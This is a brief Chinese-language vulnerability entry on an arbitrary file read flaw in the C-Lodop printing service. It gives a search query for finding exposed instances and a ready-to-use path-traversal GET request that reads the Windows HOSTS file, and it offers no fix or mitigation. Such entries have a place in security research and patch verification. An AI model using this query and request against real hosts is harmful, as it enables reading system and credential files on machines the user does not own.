# C-Lodop打印机任意文件读取漏洞

## 漏洞描述

C-Lodop打印机存在任意文件读取漏洞，通过构造特殊URL，可实现读取系统任意文件。

## 网络测绘

```
title="C-Lodop"
```

## 漏洞复现

poc：

```
GET /../../../../../../../../windows/System32/drivers/etc/HOSTS HTTP/1.1
Host: 127.0.0.1
....
```

